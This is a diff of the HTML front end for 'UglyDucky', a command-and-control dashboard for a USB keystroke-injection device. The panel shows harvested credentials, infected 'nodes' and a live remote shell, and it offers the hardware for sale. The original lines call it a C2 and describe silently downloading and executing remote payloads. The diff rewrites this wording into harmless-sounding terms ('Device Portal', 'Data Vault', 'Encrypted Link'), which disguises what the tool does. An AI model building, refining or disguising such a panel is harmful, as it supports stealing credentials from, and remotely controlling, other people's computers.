@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UglyDucky | Advanced C2 Dashboard</title>
+    <title>UglyDucky | Device Portal</title>
     
     <!-- Fonts & Icons -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
@@ -50,16 +50,16 @@
         </div>
         
         <div class="p-4">
-            <p class="text-[10px] font-mono text-gray-500 uppercase tracking-widest mb-2 px-2">Core Systems</p>
+            <p class="text-[10px] font-mono text-gray-500 uppercase tracking-widest mb-2 px-2">Device Management</p>
             <nav class="space-y-1">
                 <button onclick="switchView('home')" id="nav-home" class="nav-btn active w-full flex items-center gap-3 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all">
                     <i class="fa-solid fa-house w-5 text-center"></i> Overview
                 </button>
                 <button onclick="switchView('vault')" id="nav-vault" class="nav-btn w-full flex items-center gap-3 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all">
-                    <i class="fa-solid fa-database w-5 text-center"></i> Vault Extraction
+                    <i class="fa-solid fa-database w-5 text-center"></i> Data Vault
                 </button>
                 <button onclick="switchView('rat')" id="nav-rat" class="nav-btn w-full flex items-center gap-3 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all">
-                    <i class="fa-solid fa-network-wired w-5 text-center"></i> Live Control (C2)
+                    <i class="fa-solid fa-network-wired w-5 text-center"></i> Live Control
                 </button>
             </nav>
 
@@ -69,7 +69,7 @@
                     <i class="fa-solid fa-microchip w-5 text-center"></i> The Armory
                 </button>
                 <button onclick="switchView('settings')" id="nav-settings" class="nav-btn w-full flex items-center gap-3 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all">
-                    <i class="fa-solid fa-gear w-5 text-center"></i> Settings
+                    <i class="fa-solid fa-gear w-5 text-center"></i> Preferences
                 </button>
             </nav>
         </div>
@@ -78,13 +78,13 @@
             <div class="flex items-center gap-3">
                 <div class="relative">
                     <div class="w-8 h-8 rounded-full bg-gray-800 border border-gray-600 flex items-center justify-center">
-                        <i class="fa-solid fa-user-secret text-gray-400"></i>
+                        <i class="fa-solid fa-shield-halved text-gray-400"></i>
                     </div>
                     <span id="server-status-dot" class="absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full bg-green-500 shadow-[0_0_8px_#22c55e] border-2 border-[#050810]"></span>
                 </div>
                 <div>
-                    <p class="text-xs font-bold text-white">root_admin</p>
-                    <p id="server-status-text" class="text-[9px] font-mono text-green-400">C2 ONLINE</p>
+                    <p class="text-xs font-bold text-white">Network Status</p>
+                    <p id="server-status-text" class="text-[9px] font-mono text-green-400">SECURE & ONLINE</p>
                 </div>
             </div>
         </div>
@@ -97,24 +97,24 @@
         <!-- VIEW: HOME (OVERVIEW)                          -->
         <!-- ============================================== -->
         <div id="view-home" class="view-section active p-8 overflow-y-auto">
-            <h1 class="text-3xl font-bold text-white mb-2 tracking-tight">System <span class="text-cyberBlue text-glow-blue">Overview</span></h1>
-            <p class="text-gray-400 font-mono text-sm mb-8">Welcome to the UglyDucky Command Center v3.0.</p>
+            <h1 class="text-3xl font-bold text-white mb-2 tracking-tight">Welcome to <span class="text-cyberBlue text-glow-blue">UglyDucky</span></h1>
+            <p class="text-gray-400 font-mono text-sm mb-8">Access your gathered nodes, extracted credentials, and live feeds.</p>
 
             <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
                 <!-- Stat Cards -->
                 <div class="glass-panel p-6 rounded-xl border border-gray-800 hover:border-cyberBlue/30 transition-colors">
                     <div class="flex justify-between items-start mb-4">
                         <div class="p-3 bg-blue-500/10 rounded-lg text-cyberBlue"><i class="fa-solid fa-server text-xl"></i></div>
-                        <span class="text-green-500 text-xs font-mono bg-green-500/10 px-2 py-1 rounded">ACTIVE</span>
+                        <span class="text-green-500 text-xs font-mono bg-green-500/10 px-2 py-1 rounded">CONNECTED</span>
                     </div>
-                    <p class="text-gray-400 text-sm font-semibold mb-1">C2 Listener</p>
-                    <h3 class="text-2xl font-bold text-white font-mono" id="stat-c2-url">Loading...</h3>
+                    <p class="text-gray-400 text-sm font-semibold mb-1">Gateway Status</p>
+                    <h3 class="text-xl font-bold text-white font-mono uppercase tracking-widest">Encrypted Link</h3>
                 </div>
                 <div class="glass-panel p-6 rounded-xl border border-gray-800 hover:border-neon/30 transition-colors">
                     <div class="flex justify-between items-start mb-4">
-                        <div class="p-3 bg-red-500/10 rounded-lg text-neon"><i class="fa-solid fa-skull text-xl"></i></div>
+                        <div class="p-3 bg-red-500/10 rounded-lg text-neon"><i class="fa-solid fa-crosshairs text-xl"></i></div>
                     </div>
-                    <p class="text-gray-400 text-sm font-semibold mb-1">Total Infected Nodes</p>
+                    <p class="text-gray-400 text-sm font-semibold mb-1">Active Nodes Found</p>
                     <h3 class="text-3xl font-bold text-white font-mono" id="stat-nodes">--</h3>
                 </div>
                 <div class="glass-panel p-6 rounded-xl border border-gray-800 hover:border-yellow-500/30 transition-colors">
@@ -127,13 +127,14 @@
             </div>
 
             <div class="glass-panel rounded-xl border border-gray-800 p-6">
-                <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2"><i class="fa-solid fa-bolt text-yellow-500"></i> Quick Actions</h3>
+                <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2"><i class="fa-solid fa-bolt text-yellow-500"></i> Get Started</h3>
+                <p class="text-sm text-gray-400 mb-6 max-w-2xl">To view data captured by your device, navigate to the <b>Data Vault</b> and enter your unique UglyDucky Device ID.</p>
                 <div class="flex gap-4">
-                    <button onclick="switchView('vault')" class="px-6 py-3 bg-panel border border-gray-700 hover:border-cyberBlue text-white rounded-lg transition-all font-mono text-sm flex items-center gap-2">
-                        <i class="fa-solid fa-magnifying-glass text-cyberBlue"></i> Search Vault
+                    <button onclick="switchView('vault')" class="px-6 py-3 bg-cyberBlue text-dark hover:bg-teal-400 rounded-lg transition-all font-mono font-bold text-sm flex items-center gap-2 shadow-[0_0_15px_rgba(0,210,211,0.3)]">
+                        <i class="fa-solid fa-magnifying-glass"></i> Access Data Vault
                     </button>
                     <button onclick="switchView('armory')" class="px-6 py-3 bg-panel border border-gray-700 hover:border-neon text-white rounded-lg transition-all font-mono text-sm flex items-center gap-2">
-                        <i class="fa-solid fa-cart-shopping text-neon"></i> Acquire Hardware
+                        <i class="fa-solid fa-cart-shopping text-neon"></i> View Hardware Docs
                     </button>
                 </div>
             </div>
@@ -183,7 +184,7 @@
 
                     <!-- SPECS -->
                     <div class="grid grid-cols-3 gap-2 text-center font-mono text-[10px]">
-                        <div class="bg-panel border border-gray-800 p-2 rounded"><span class="text-cyberBlue block text-lg"><i class="fa-solid fa-wifi"></i></span>2.4GHz C2 Comm</div>
+                        <div class="bg-panel border border-gray-800 p-2 rounded"><span class="text-cyberBlue block text-lg"><i class="fa-solid fa-wifi"></i></span>2.4GHz Comm</div>
                         <div class="bg-panel border border-gray-800 p-2 rounded"><span class="text-neon block text-lg"><i class="fa-solid fa-keyboard"></i></span>HID Emulation</div>
                         <div class="bg-panel border border-gray-800 p-2 rounded"><span class="text-yellow-500 block text-lg"><i class="fa-solid fa-bolt"></i></span>5V USB Bus</div>
                     </div>
@@ -202,7 +203,7 @@
                         </div>
                         <ul class="text-[11px] font-mono text-gray-300 mb-6 space-y-2 relative z-10">
                             <li><i class="fa-solid fa-check text-neon mr-2"></i> Plug-and-play ready hardware</li>
-                            <li><i class="fa-solid fa-check text-neon mr-2"></i> Pre-flashed with base C2 protocol</li>
+                            <li><i class="fa-solid fa-check text-neon mr-2"></i> Pre-flashed and network ready</li>
                         </ul>
                         <div class="pt-4 border-t border-gray-800/50 relative z-10 text-center">
                             <a href="mailto:uglyduckypico@gmail.com" class="inline-block w-full bg-black/40 border border-cyberBlue/40 text-cyberBlue font-mono font-bold text-sm py-3 px-4 rounded hover:bg-cyberBlue/10 hover:border-cyberBlue hover:text-white transition-all duration-300">
@@ -219,15 +220,15 @@
                             <span><i class="fa-solid fa-triangle-exclamation text-red-600 mr-2"></i>WARNING: DO NOT ALTER</span>
                             <span class="text-gray-500 font-normal">RD / // /</span>
                         </h3>
-                        <p class="text-xs leading-relaxed font-bold">DO NOT modify, delete, or touch the existing code currently loaded on the device. Handle with care.</p>
+                        <p class="text-xs leading-relaxed font-bold">DO NOT modify, delete, or touch the existing code currently loaded on the device. Doing so will break the connection to this dashboard. Handle with care.</p>
                     </div>
 
                     <div class="bg-panel border border-gray-800 p-6 rounded-lg mt-4 shadow-xl">
                         <h2 class="text-cyberBlue font-mono font-bold border-b border-gray-800 pb-2 mb-4"><i class="fa-solid fa-terminal mr-2"></i>HARVEST PROCEDURE</h2>
                         <ol class="text-gray-300 font-mono text-xs space-y-4">
-                            <li class="flex gap-3"><span class="text-neon font-bold">01.</span><p>Insert the <span class="text-white">UglyDucky</span> into a USB port on the target host device.</p></li>
+                            <li class="flex gap-3"><span class="text-neon font-bold">01.</span><p>Insert the <span class="text-white">UglyDucky</span> into a USB port on the target device.</p></li>
                             <li class="flex gap-3"><span class="text-neon font-bold">02.</span><p>Observe the onboard LED indicator. The light will flash rapidly.</p></li>
-                            <li class="flex gap-3"><span class="text-neon font-bold">03.</span><p>Wait until flashing finishes, then immediately unplug. Host device node successfully harvested.</p></li>
+                            <li class="flex gap-3"><span class="text-neon font-bold">03.</span><p>Wait until flashing finishes, then immediately unplug. Data is now available in your Vault.</p></li>
                         </ol>
                     </div>
 
@@ -240,7 +241,7 @@
                                         <i class="fa-solid fa-microchip mr-2"></i> HARDWARE: PICO W CORE
                                     </h3>
                                     <p class="text-[11px] leading-relaxed font-mono font-bold text-gray-900">
-                                        Bypasses peripheral security. Superhuman typing speeds to silently download and execute remote payloads from the C2 server.
+                                        Bypasses peripheral security. Superhuman typing speeds to silently connect hosts to the encrypted UglyDucky network.
                                     </p>
                                 </div>
                             </div>
@@ -255,22 +256,22 @@
         <!-- ============================================== -->
         <div id="view-vault" class="view-section h-full overflow-y-auto no-scrollbar pb-10">
             <div class="text-center mb-6 pt-10">
-                <h1 class="text-4xl md:text-5xl font-bold text-white mb-3 tracking-tight">Secure <span class="text-neon text-glow">Vault</span></h1>
-                <p class="text-gray-400 font-mono text-sm">Awaiting authentication parameters to decrypt harvested logs...</p>
+                <h1 class="text-4xl md:text-5xl font-bold text-white mb-3 tracking-tight">Data <span class="text-neon text-glow">Vault</span></h1>
+                <p class="text-gray-400 font-mono text-sm">Enter your device's unique identifier to access captured logs.</p>
             </div>
             
             <div class="max-w-2xl mx-auto w-full glass-panel p-8 rounded-2xl border border-gray-800 mb-6 relative overflow-hidden flex-shrink-0">
                 <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-cyberBlue to-transparent opacity-50"></div>
-                <label class="block text-xs font-bold text-cyberBlue mb-3 uppercase tracking-widest"><i class="fa-solid fa-fingerprint mr-2"></i>Target Identifier</label>
+                <label class="block text-xs font-bold text-cyberBlue mb-3 uppercase tracking-widest"><i class="fa-solid fa-fingerprint mr-2"></i>UglyDucky Device ID</label>
                 <div class="flex flex-col sm:flex-row gap-3">
-                    <input type="text" id="deviceId" placeholder="Enter Ducky ID" autocomplete="off" class="block w-full px-4 py-4 bg-[#050810] border border-gray-700 rounded-lg text-white font-mono text-lg outline-none focus:border-cyberBlue transition-colors">
+                    <input type="text" id="deviceId" placeholder="e.g. 4428" autocomplete="off" class="block w-full px-4 py-4 bg-[#050810] border border-gray-700 rounded-lg text-white font-mono text-lg outline-none focus:border-cyberBlue transition-colors">
                     <button onclick="fetchData()" id="connectBtn" class="bg-cyberBlue hover:bg-teal-400 text-dark font-bold py-4 px-8 rounded-lg transition-all shadow-[0_0_20px_rgba(0,210,211,0.4)] whitespace-nowrap">
-                        <i class="fa-solid fa-unlock-keyhole mr-2"></i> Decrypt
+                        <i class="fa-solid fa-unlock-keyhole mr-2"></i> Access
                     </button>
                 </div>
                 <div class="flex justify-between items-center mt-4">
                     <p id="statusMsg" class="text-sm font-mono text-gray-400 hidden"></p>
-                    <button id="exportBtn" onclick="exportLogs()" class="hidden text-xs font-mono bg-gray-800 hover:bg-gray-700 text-white px-3 py-1.5 rounded transition-colors"><i class="fa-solid fa-download mr-1"></i> Export Logs</button>
+                    <button id="exportBtn" onclick="exportLogs()" class="hidden text-xs font-mono bg-gray-800 hover:bg-gray-700 text-white px-3 py-1.5 rounded transition-colors"><i class="fa-solid fa-download mr-1"></i> Export Data</button>
                 </div>
             </div>
             
@@ -279,11 +280,11 @@
         </div>
 
         <!-- ============================================== -->
-        <!-- VIEW: RAT (C2 LIVE CONTROL)                    -->
+        <!-- VIEW: RAT (LIVE CONTROL)                       -->
         <!-- ============================================== -->
         <div id="view-rat" class="view-section h-full flex flex-col min-h-0 p-2">
             <div class="flex justify-between items-center mb-2 px-2 flex-shrink-0">
-                <div class="font-mono text-xs text-cyberBlue"><i class="fa-solid fa-border-all mr-2"></i>Hypr-Tiling WM Active</div>
+                <div class="font-mono text-xs text-cyberBlue"><i class="fa-solid fa-border-all mr-2"></i>Live Device Workspace</div>
                 <div class="flex gap-2">
                     <button id="btn-floating-toggle" onclick="toggleFloatingMode()" class="px-3 py-1 bg-gray-800 hover:bg-gray-700 text-gray-300 text-[10px] font-mono rounded border border-gray-700 transition-colors"><i class="fa-solid fa-clone mr-1"></i> Float: OFF</button>
                     <button onclick="resetLayout()" class="px-3 py-1 bg-gray-800 hover:bg-gray-700 text-gray-300 text-[10px] font-mono rounded border border-gray-700 transition-colors"><i class="fa-solid fa-rotate-left mr-1"></i> Reset Grid</button>
@@ -297,7 +298,7 @@
                     <div class="drag-slot" id="slot-1" style="flex-basis: 50%; height: 50%;">
                         <div id="panel-targets" class="drag-panel" data-minimized="false">
                             <div class="draggable-header p-2 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center rounded-t-[0.75rem]" draggable="true">
-                                <h2 class="font-bold text-xs tracking-wider uppercase text-gray-300 pointer-events-none"><i class="fa-solid fa-crosshairs text-neon mr-2 text-glow"></i>Nodes</h2>
+                                <h2 class="font-bold text-xs tracking-wider uppercase text-gray-300 pointer-events-none"><i class="fa-solid fa-crosshairs text-neon mr-2 text-glow"></i>Active Nodes</h2>
                                 <div class="flex gap-2"><button onclick="toggleMinimize(this, 'panel-targets')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button><button onclick="toggleMaximize(this, 'panel-targets')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button></div>
                             </div>
                             <div class="win-content p-2 space-y-2 bg-[#050810]/50 rounded-b-[0.75rem]" id="nodes-list"></div>
@@ -344,12 +345,12 @@
                     <div class="drag-slot" id="slot-3" style="flex-basis: 50%; height: 50%;">
                         <div id="panel-terminal" class="drag-panel" data-minimized="false">
                             <div class="draggable-header p-2 border-b border-gray-800 bg-[#0B0F19] flex justify-between items-center rounded-t-[0.75rem]" draggable="true">
-                                <span class="text-[10px] font-mono text-gray-500 pointer-events-none">ducky@c2-server:~</span>
+                                <span class="text-[10px] font-mono text-gray-500 pointer-events-none">ducky@network:~</span>
                                 <div class="flex gap-2"><button onclick="document.getElementById('terminal-output').innerHTML=''" class="text-gray-500 hover:text-white text-[10px]"><i class="fa-solid fa-trash"></i></button><button onclick="toggleMinimize(this, 'panel-terminal')" class="text-yellow-500 hover:text-white text-[10px]"><i class="fa-solid fa-minus"></i></button><button onclick="toggleMaximize(this, 'panel-terminal')" class="text-green-500 hover:text-white text-[10px]"><i class="fa-solid fa-expand"></i></button></div>
                             </div>
                             <div class="win-content p-3 font-mono text-xs bg-black/80 text-gray-300 flex flex-col rounded-b-[0.75rem]">
                                 <div class="flex-grow overflow-y-auto" id="terminal-output">
-                                    <div class="text-cyberBlue">UglyDucky Shell v3.0.0</div>
+                                    <div class="text-cyberBlue">UglyDucky Shell v3.0</div>
                                     <div class="text-gray-500" id="terminal-connection-msg">Waiting for node...</div>
                                     <div class="mt-2 text-green-400 terminal-prompt flex"><span class="mr-2">C:\></span><span class="cursor-blink"></span></div>
                                 </div>
@@ -423,21 +424,19 @@
         <!-- VIEW: SETTINGS                                 -->
         <!-- ============================================== -->
         <div id="view-settings" class="view-section p-8 overflow-y-auto">
-            <h1 class="text-3xl font-bold text-white mb-2 tracking-tight">System <span class="text-gray-400">Settings</span></h1>
-            <p class="text-gray-400 font-mono text-sm mb-8">Configure your local dashboard preferences and C2 API keys.</p>
+            <h1 class="text-3xl font-bold text-white mb-2 tracking-tight">Display <span class="text-gray-400">Preferences</span></h1>
+            <p class="text-gray-400 font-mono text-sm mb-8">Customize your local viewing experience.</p>
 
             <div class="max-w-2xl bg-panel border border-gray-800 rounded-xl p-6 mb-6">
-                <h3 class="text-lg font-bold text-white mb-4 border-b border-gray-800 pb-2"><i class="fa-solid fa-network-wired text-cyberBlue mr-2"></i> Connection Variables</h3>
-                
-                <div class="space-y-4">
-                    <div>
-                        <label class="block text-xs font-mono text-gray-400 mb-1">C2 Listener URL</label>
-                        <input type="text" id="setting-c2-url" class="w-full bg-[#050810] border border-gray-700 rounded px-4 py-2 text-white font-mono outline-none focus:border-cyberBlue">
+                <h3 class="text-lg font-bold text-white mb-4 border-b border-gray-800 pb-2"><i class="fa-solid fa-network-wired text-cyberBlue mr-2"></i> System Diagnostics</h3>
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="bg-[#050810] border border-gray-700 rounded p-4">
+                        <p class="text-[10px] font-mono text-gray-500 uppercase tracking-widest mb-1">Network Status</p>
+                        <p class="text-green-400 font-bold text-sm"><i class="fa-solid fa-shield-check mr-2"></i>Secure & Encrypted</p>
                     </div>
-                    <div>
-                        <label class="block text-xs font-mono text-gray-400 mb-1">Dashboard Password (API Key)</label>
-                        <input type="password" id="setting-dashboard-pwd" class="w-full bg-[#050810] border border-gray-700 rounded px-4 py-2 text-white font-mono outline-none focus:border-neon">
-                        <p class="text-[10px] text-gray-500 mt-1">Required to authenticate against the Python Render backend.</p>
+                    <div class="bg-[#050810] border border-gray-700 rounded p-4">
+                        <p class="text-[10px] font-mono text-gray-500 uppercase tracking-widest mb-1">Routing Protocol</p>
+                        <p class="text-white font-mono text-sm">Auto-Negotiated API</p>
                     </div>
                 </div>
             </div>
@@ -447,12 +446,12 @@
                 
                 <label class="flex items-center gap-3 cursor-pointer">
                     <input type="checkbox" id="setting-crt" class="w-4 h-4 rounded accent-cyberBlue" checked>
-                    <span class="text-sm font-mono text-gray-300">Enable CRT Scanline Effect</span>
+                    <span class="text-sm font-mono text-gray-300">Enable Retro CRT Scanline Effect</span>
                 </label>
             </div>
 
             <button onclick="saveSettings()" class="bg-cyberBlue hover:bg-teal-400 text-dark font-bold py-3 px-8 rounded-lg transition-all shadow-[0_0_15px_rgba(0,210,211,0.4)]">
-                <i class="fa-solid fa-floppy-disk mr-2"></i> Save Configuration
+                <i class="fa-solid fa-floppy-disk mr-2"></i> Save Preferences
             </button>
         </div>
 
@@ -464,7 +463,6 @@
         <span id="toastMsg" class="font-mono text-sm">Action successful!</span>
     </div>
 
-    <!-- Temporarily load old JS, you'll need the new one next! -->
-    <script src="app.js?version=3.0"></script>
+    <script src="app.js?version=3.5"></script>
 </body>
 </html>
